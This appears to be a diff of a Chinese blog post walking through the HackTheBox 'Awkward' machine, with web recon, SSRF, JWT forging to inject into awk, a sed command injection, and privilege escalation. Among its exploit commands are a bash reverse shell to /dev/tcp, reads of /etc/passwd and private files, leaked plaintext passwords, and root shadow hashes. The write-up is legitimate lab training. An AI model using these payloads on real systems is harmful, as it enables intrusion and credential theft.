@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;503  10.10.11.185                                                                                                              端口扫描22和80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;503  10.10.11.185   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.185Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-25 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Awkward - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/10/30/Awkward-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;503  10.10.11.185                                                                                                              端口扫描22和80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;503  10.10.11.185   端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.185Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-25 1">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022102501.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022102502.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022102503.jpg">
@@ -125,8 +125,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -148,7 +155,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -216,14 +223,7 @@
 </li>
 <li><h2 id="10-10-11-185"><a href="#10-10-11-185" class="headerlink" title="10.10.11.185"></a>10.10.11.185</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102501.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.185</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 13:15 CST</span><br><span class="line">Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% done; ETC: 13:16 (0:00:06 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.185</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)</span><br><span class="line">|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 68.53 seconds</span><br></pre></td></tr></table></figure>
 
@@ -232,14 +232,7 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.185 hat-valley.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102502.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102502.jpg" alt=""></p>
 <h2 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h2><p>/js/app.js中可以得到一些路由(也可以在后面的ssrf中得到)：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> baseURL = <span class="string">"/api/"</span></span><br><span class="line"></span><br><span class="line">/all-leave</span><br><span class="line">/submit-leave</span><br><span class="line">/login</span><br><span class="line">/staff-details</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> routes = [&#123;  <span class="attr">path</span>: <span class="string">"/"</span>,  <span class="attr">name</span>: <span class="string">"base"</span>,  <span class="attr">component</span>: _Base_vue__WEBPACK_IMPORTED_MODULE_3__[<span class="string">"default"</span>]&#125;, &#123;  <span class="attr">path</span>: <span class="string">"/hr"</span>,  <span class="attr">name</span>: <span class="string">"hr"</span>,  <span class="attr">component</span>: _HR_vue__WEBPACK_IMPORTED_MODULE_4__[<span class="string">"default"</span>]&#125;, &#123;  <span class="attr">path</span>: <span class="string">"/dashboard"</span>,  <span class="attr">name</span>: <span class="string">"dashboard"</span>,  <span class="attr">component</span>: _Dashboard_vue__WEBPACK_IMPORTED_MODULE_5__[<span class="string">"default"</span>],  <span class="attr">meta</span>: &#123;    <span class="attr">requiresAuth</span>: <span class="literal">true</span>  &#125;&#125;, &#123;  <span class="attr">path</span>: <span class="string">"/leave"</span>,  <span class="attr">name</span>: <span class="string">"leave"</span>,  <span class="attr">component</span>: _Leave_vue__WEBPACK_IMPORTED_MODULE_6__[<span class="string">"default"</span>],  <span class="attr">meta</span>: &#123;    <span class="attr">requiresAuth</span>: <span class="literal">true</span>  &#125;&#125;];</span><br></pre></td></tr></table></figure>
 
@@ -247,24 +240,10 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://hat-valley.htb/" -H 'Host: FUZZ.hat-valley.htb' -fs 132</span><br><span class="line"></span><br><span class="line">store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 201ms]</span><br></pre></td></tr></table></figure>
 
 <p>需要登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102503.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102503.jpg" alt=""></p>
 <p>#hat-valley.htb </p>
 <h2 id="hr-to-dashboard"><a href="#hr-to-dashboard" class="headerlink" title="hr to dashboard"></a>hr to dashboard</h2><p><a href="http://hat-valley.htb/hr" target="_blank" rel="noopener">http://hat-valley.htb/hr</a> 也是需要登录，默认cookie是guest，修改为其他任意，可以访问到dashboard：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102504.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102504.jpg" alt=""></p>
 <h2 id="staff-details"><a href="#staff-details" class="headerlink" title="staff-details"></a>staff-details</h2><p>staff-details api 未授权，得到一些用户名和密码hash，可以破解出来其中christopher.jones的密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;hat-valley.htb&#x2F;api&#x2F;staff-details | jq</span><br><span class="line"></span><br><span class="line">&quot;username&quot;: &quot;christopher.jones&quot;,</span><br><span class="line">&quot;password&quot;: &quot;e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1&quot;,</span><br><span class="line">    </span><br><span class="line">chris123</span><br></pre></td></tr></table></figure>
 
@@ -274,33 +253,12 @@
 <h2 id="store-status-SSRF"><a href="#store-status-SSRF" class="headerlink" title="store-status SSRF"></a>store-status SSRF</h2><p>store-status那里可以SSRF，发现3002端口泄漏代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;hat-valley.htb&#x2F;api&#x2F;store-status?url&#x3D;%22http:%2F%2F127.0.0.1:3002%22</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102505.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="awk-参数注入"><a href="#awk-参数注入" class="headerlink" title="awk 参数注入"></a>awk 参数注入</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102511.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102505.jpg" alt=""></p>
+<h2 id="awk-参数注入"><a href="#awk-参数注入" class="headerlink" title="awk 参数注入"></a>awk 参数注入</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102511.jpg" alt=""></p>
 <p>查看上面的代码，之前是有非预期命令注入的，现在已经修复了，预期方案是jwt伪造用户名，注入到awk中，达成任意文件读取效果：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", &#123;encoding: 'binary', maxBuffer: 51200000&#125;, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /etc/passwd 'a" -p 123beany123 -S hs256 -I</span><br><span class="line"></span><br><span class="line">"awk '/" + /' /etc/passwd 'a + "/' /var/www/private/leave_requests.csv"</span><br><span class="line"></span><br><span class="line">"awk '/"/' /etc/passwd 'a"/' /var/www/private/leave_requests.csv"</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102506.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102506.jpg" alt=""></p>
 <h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>一步步读取文件，得到bean用户的密码</p>
 <h2 id="home-bean-bashrc"><a href="#home-bean-bashrc" class="headerlink" title="/home/bean/.bashrc"></a>/home/bean/.bashrc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /home/bean/.bashrc 'a" -p 123beany123 -S hs256 -I</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> custom</span></span><br><span class="line">alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'</span><br></pre></td></tr></table></figure>
 
@@ -309,34 +267,13 @@
 <h2 id="bean-backup-final-tar-gz"><a href="#bean-backup-final-tar-gz" class="headerlink" title="bean_backup_final.tar.gz"></a>bean_backup_final.tar.gz</h2><p>这个压缩包中的另一个压缩包，配置文件中得到bean的密码</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /home/bean/Documents/backup/bean_backup_final.tar.gz 'a" -p 123beany123 -S hs256 -I</span><br><span class="line"></span><br><span class="line">bean.hill</span><br><span class="line">014mrbeanrules!#P</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102507.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure> 
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102507.jpg" alt=""> </p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>bean ssh登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102508.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102508.jpg" alt=""></p>
 <h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><p>store前面看是需要密码的，现在可以去读配置文件，破解不出来，但其实就是bean用户的密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bean@awkward:/var/www/store$ cat /etc/nginx/conf.d/.htpasswd</span><br><span class="line">admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">014mrbeanrules!#P</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102512.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102512.jpg" alt=""></p>
 <p>结合代码中相关说明，现在没有使用数据库，使用本地文件进行相关处理</p>
 <p>代码审计发现，cart_actions.php中删除cart时调用sed，可以进行命令注入，但过滤了很多字符，不能直接使用gtfobins中常规利用方式：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bad_chars = <span class="keyword">array</span>(<span class="string">";"</span>,<span class="string">"&amp;"</span>,<span class="string">"|"</span>,<span class="string">"&gt;"</span>,<span class="string">"&lt;"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>,<span class="string">"`"</span>,<span class="string">"$"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&#123;"</span>,<span class="string">"&#125;"</span>,<span class="string">"["</span>,<span class="string">"]"</span>,<span class="string">"!"</span>,<span class="string">"#"</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">"sed -i '/item_id=&#123;$item_id&#125;/d' &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;"</span>);</span><br></pre></td></tr></table></figure>
@@ -358,51 +295,16 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bean@awkward:/var/www/store/cart$ rm 557e-1746-524-ee64</span><br><span class="line">rm: remove write-protected regular file '557e-1746-524-ee64'? y</span><br><span class="line">bean@awkward:/var/www/store/cart$ nano 557e-1746-524-ee6</span><br><span class="line"></span><br><span class="line">bean@awkward:/var/www/store/cart$ cat 557e-1746-524-ee64</span><br><span class="line">***Hat Valley Cart***</span><br><span class="line">item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90</span><br><span class="line"></span><br><span class="line">bean@awkward:/var/www/store/cart$ cat /tmp/shell.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>修改完成后删除购物车中商品，删除时同样要拦截请求修改其中数据，触发命令执行：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102513.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102513.jpg" alt=""></p>
 <p> 这样得到的是www-data shell:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102514.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102514.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>运行pspy可以发现，当有新的请假请求时，会调用mail命令拼接对应csv文件中的name，这个文件我们现在的www-data有权限编辑：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102509.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102510.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102509.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102510.jpg" alt=""></p>
 <p>所以这里是另一个命令注入</p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bean@awkward:/var/www/store/cart$ cat /tmp/priv.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">chmod +s /bin/bash</span><br><span class="line"></span><br><span class="line">bean@awkward:/var/www/store/cart$ chmod 777 /tmp/priv.sh</span><br><span class="line"></span><br><span class="line">www-data@awkward:~/private$ echo '" --exec="\!/tmp/priv.sh"' &gt;&gt; leave_requests.csv</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102515.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022102515.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$ZIlTVYLPszqZujGML5.&#x2F;W.$HD3g2FwVlePYbdiEVZ7YyKXtIl3IoenZkQLVx5VhH92:19250:0:99999:7:::</span><br><span class="line">bean:$y$j9T$0oEkN6BXZ6CRpf&#x2F;T8roPn&#x2F;$bjeeSZqTdNXg7K2mosuZVCYqEfBP.M6isvq.mro0Ii0:19250:0:99999:7:::</span><br><span class="line">christine:$y$j9T$a&#x2F;zXQvT00y0B4j75qhmWw&#x2F;$YVcc67qoysqts2Gf51.SChXv8Y1mPEV&#x2F;w3Bh&#x2F;g&#x2F;Ok8D:19250:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
@@ -418,7 +320,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-02-27T01:06:04.606Z" itemprop="dateUpdated">2023-02-27 09:06:04</time>
+    Last updated: <time datetime="2023-02-27T01:06:04.606Z" itemprop="dateUpdated">2023-02-27 09:06:04</time>
 </span><br>
 
 
@@ -585,11 +487,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
